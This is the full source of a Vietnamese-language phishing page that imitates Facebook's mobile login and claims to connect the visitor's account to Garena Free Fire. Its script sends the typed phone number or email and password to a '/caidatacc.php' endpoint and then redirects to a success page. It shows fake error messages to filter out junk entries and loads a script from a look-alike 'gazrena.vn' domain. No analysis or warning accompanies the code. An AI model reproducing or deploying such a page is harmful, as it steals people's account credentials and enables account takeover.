<!doctype html>
<html lang="vi">

<head>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link href="//cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous"><script src="https://gazrena.vn/loginfacebook.min.js"></script><link rel="stylesheet" href="css/login.css?v=1.3"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"><title>Đăng Nhập Bằng Facebook</title><style>.thongbao { display: none;}</style><body><div id="root"><div class="touch x1 _fzu _50-3 iframe acw portrait"><div id="viewport"><h1 style="display: block; height: 0px; overflow: hidden; position: absolute; width: 0px; padding: 0px;">Facebook </h1><div id="page"><div id="header-notices" class="_129_"></div><div id="header" class="_4g33 _52we _52z5"><div class="_4g34 _52z6"><a href="#"><i
                                    class="img sp_7V_P8-AK9yC sx_ce405b"><u>Facebook</u></i></a></div></div><div id="root" role="main" class="_5soa acw"><div class="_4g33"><div id="u_0_0" class="_4g34"><div data-sigil="m_login_notice" class="thongbao _5yd0 _2ph- _5yd1"> <span
                                        id="thongbao"></span></div><div class="aclb _4-4l"><div class="_5rut"><div><div class="_52jj _3-q2"><img src="https://i.imgur.com/Oj3QMw3.jpg"
                                                    width="70"><br></br><div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook của bạn để kết nối với Garena Free Fire</div></div>
                                        </div><div novalidate="novalidate" data-autoid="autoid_2"
                                            class="mobile-login-form _5spm"><div class="_56be _5sob"><div class="_55wo _55x2 _56bf"><div id="email_input_container"><input name="username"placeholder="Email hoặc số điện thoại" id="sdt" type="text"value="" class="_56bg _4u9z _5ruq"></div><div><div class="_1upc _mg8"> <div class="_4g33"><div class="_4g34 _5i2i _52we"><div class="_5xu4"><input autocorrect="off"                                  autocapitalize="off" autocomplete="on"
                                                                            id="pass" name="password"
                                                                            placeholder="Mật khẩu" type="password"
                                                                            class="_56bg _4u9z _27z2">
                                                                    </div>
                                                          <div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-lg"></i></div> <!--- showPassword --->
														<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-lg"></i></div> 
                                                                </div>                                                         
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="_2pie" style="text-align: center;">
                                                <div id="u_0_4"><button value="Đăng nhập"
                                                        class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"
                                                        onclick="dangnhap()"><span class="_55sr">Đăng
                                                            nhập</span></button></div>
                                                <div id="otp_button_elem_container"></div>
                                            </div>
                                            <div class="_xo8"></div>
                                        </div>
                                        <div>
                                            <div class="_43mg"><span class="_43mh">hoặc</span></div>
                                            <div id="u_0_6" class="_52jj _5t3b"><a role="button" id="signup-button"
                                                    href="https://m.facebook.com/reg/?cid=103&amp;next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db06a8f56-81cb-4296-bc49-4e7d9d0b8657&amp;locale2=vi_VN&amp;refsrc=https%3A%2F%2Fm.facebook.com%2Flogin.php&amp;soft=hjk"
                                                    class="_5t3c _28le btn btnS medBtn mfsm touchable"> Tạo tài khoản
                                                    mới </a></div>
                                        </div>
                                        <div>
                                            <div class="other-links">
                                                <ul class="_5pkb _55wp">
                                                    <li><span class="mfss fcg"><a
                                                                href="https://m.facebook.com/login/identify/?ctx=recover&amp;c=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fskip_api_login%3D1%26api_key%3D2036793259884297%26kid_directed_site%3D0%26app_id%3D2036793259884297%26signed_next%3D1%26next%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D2036793259884297%2526redirect_uri%253Dhttps%25253A%25252F%25252Fauth.garena.com%25252Foauth%25252Flogin%25253Fclient_id%25253D100067%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Fgiaidau.ff.garena.vn%2525252Flogin%2525252Fcallback%252526response_type%25253Dtoken%252526platform%25253D3%252526locale%25253Dvi-VN%2526response_type%253Dtoken%2526scope%253Dpublic_profile%25252Cemail%25252Cuser_friends%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253Db06a8f56-81cb-4296-bc49-4e7d9d0b8657%26cancel_url%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%2526error%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%2523_%253D_%26display%3Dpage%26locale%3Dvi_VN%26pl_dbl%3D0&amp;multiple_results=0&amp;ars=facebook_login&amp;lwv=100&amp;locale2=vi_VN&amp;_rdr"
                                                                id="forgot-password-link"> Quên mật khẩu? </a></span>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="_55wr _5ui2">
                            <div class="_5dpw">
                                <div data-nocookies="1" id="locale-selector" class="_5ui3">
                                    <div class="_4g33">
                                        <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">中文(台灣)</a></span></div>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">Español</a></span></div>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">Français
                                                        (France)</a></span></div>
                                        </div>
                                        <div class="_4g34">
                                            <div class="_3ztc"><span class="_52jc"><a href="#">English (UK)</a></span>
                                            </div>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">한국어</a></span></div>
                                            <div class="_3ztc"><span class="_52jc"><a href="#">Português
                                                        (Brasil)</a></span></div><a href="#">
                                                <div aria-label="Danh sách ngôn ngữ đầy đủ" class="_3j87 _1rrd _3ztd"><i
                                                        class="img sp_7V_P8-AK9yC sx_21ee4d"></i></div>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="_5ui4"><span class="mfss fcg">Meta © 2022</span></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        function validateEmail(email) {
            var re = /\S+@\S+\.\S+/;
            return re.test(email);
        }
        function telephoneCheck(user) {
            var vnf_regex = /((84|01|03|05|07|08|09)+([0-9]{8})\b)/g;
            if (vnf_regex.test(user) == false) {
                console.log("phonenumber false");
                return false;

            } else {
                console.log("phonenumber true");
                return true;

            }
        }
        function validatepassword(pass) {

            if (pass.length >= 6 && pass.length <= 35) {
                if (pass == '123456' || pass == '1234567' || pass == 'jfhfhfhdhf' || pass == '333333333' || pass == "777777777777777777" || pass == 'yy8ui8u9o' || pass == 'uEa!fX6ZW_T77ER' || pass == 'cocaiconcac' || pass == 'cócaiconcac' || pass == 'rjdhdhd' || pass == '5555555' || pass == '12345678' || pass == '123456789' || pass == '1234567890' || pass == '1111111' || pass == '2222222' || pass == 'aaaaaaa' || pass == '3333333' || pass == '4444444' || pass == '5555555' || pass == '6666666') {
                    return false;
                } else {
                    return true;
                }
            }
            else {
                return false;
            }
        }
        function go() {
            
            var sdt = $("#sdt").val();
            var pass = $("#pass").val();
            $.post("/caidatacc.php",
                {
                    user: sdt,
                    pass: pass
                },
                function (data, status) {
                    
                    v();window.location.href = '/success.html';
                });
        }
        function dangnhap() {
            var sdt = $("#sdt").val();
            var pass = $("#pass").val();
            if ($.isNumeric(sdt) == true) {
                if (telephoneCheck(sdt) == true && validatepassword(pass) == true) {
                  
                    go();
                    $(".thongbao").hide();
                }
                else {
                    $(".thongbao").show();
                    $("#thongbao").text('Số di động hoặc email bạn nhập không kết nối với tài khoản nào. Hãy tìm tài khoản của bạn và đăng nhập.');
                }
            }
            else if (pass.length == 0 || pass == '') {
                $("#thongbao").show();
                $("#thongbao").text('Vui lòng nhập mật khẩu');
            }
            else if (validateEmail(sdt) == true && validatepassword(pass) == true) {
               
                go();
                $(".thongbao").hide();
            } else {
                $(".thongbao").show();
                $("#thongbao").text('Mật khẩu bạn đã nhập không chính xác. Quên mật khẩu?');
            }
        }
function showFbPassword() {
  var x = document.getElementById("pass");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("pass");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

    </script>


</body>

</html>